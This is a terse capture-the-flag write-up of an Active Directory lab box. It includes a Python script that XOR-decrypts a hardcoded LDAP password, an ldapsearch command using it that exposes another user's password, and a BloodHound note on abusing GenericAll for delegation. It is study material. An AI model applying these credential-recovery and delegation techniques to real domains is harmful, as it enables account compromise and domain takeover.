# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #Delegation 

# Findings

## External
### Enumeration
![](https://i.imgur.com/XfSSbbk.png)
![](https://i.imgur.com/RB68laY.png)

![](https://i.imgur.com/i0AYq8v.png)
![](https://i.imgur.com/59khnmo.png)
- I made a python revering code and i decrypted the code
```python
import base64

def decrypt_password(enc_password, key):
    # Convert the Base64 encoded string back to byte array
    encrypted_bytes = base64.b64decode(enc_password)
    key_bytes = key.encode('ascii')
    
    # Prepare the array to hold the decrypted bytes
    decrypted_bytes = bytearray(len(encrypted_bytes))
    
    # Decrypt each byte
    for i in range(len(encrypted_bytes)):
        decrypted_bytes[i] = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ 223
    
    # Convert byte array back to string
    decrypted_password = decrypted_bytes.decode('ascii')
    
    return decrypted_password

# Given encrypted password and key
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

# Decrypt the password
decrypted_password = decrypt_password(enc_password, key)
print("Decrypted Password:", decrypted_password)

```
- Password: ` nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
### Gaining Access
![](https://i.imgur.com/vsC8XeY.png)
![](https://i.imgur.com/JDeVqes.png)
`ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb' "(objectClass=*)" | tee ldap` ![](https://i.imgur.com/ajJyJHL.png)
` support : Ironside47pleasure40Watchful `
## Internal
### Enumeration
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
```
When I check BloodHound the User is in group Shared Support account and that group is a genericAll on he DC so, i can do delegations.
![[Pasted image 20240608081519.png]]
### Gaining Access
![](https://i.imgur.com/7nvsrUT.png)
### Maintaining Access
![](https://i.imgur.com/YEJVqgs.png)


# Random Notes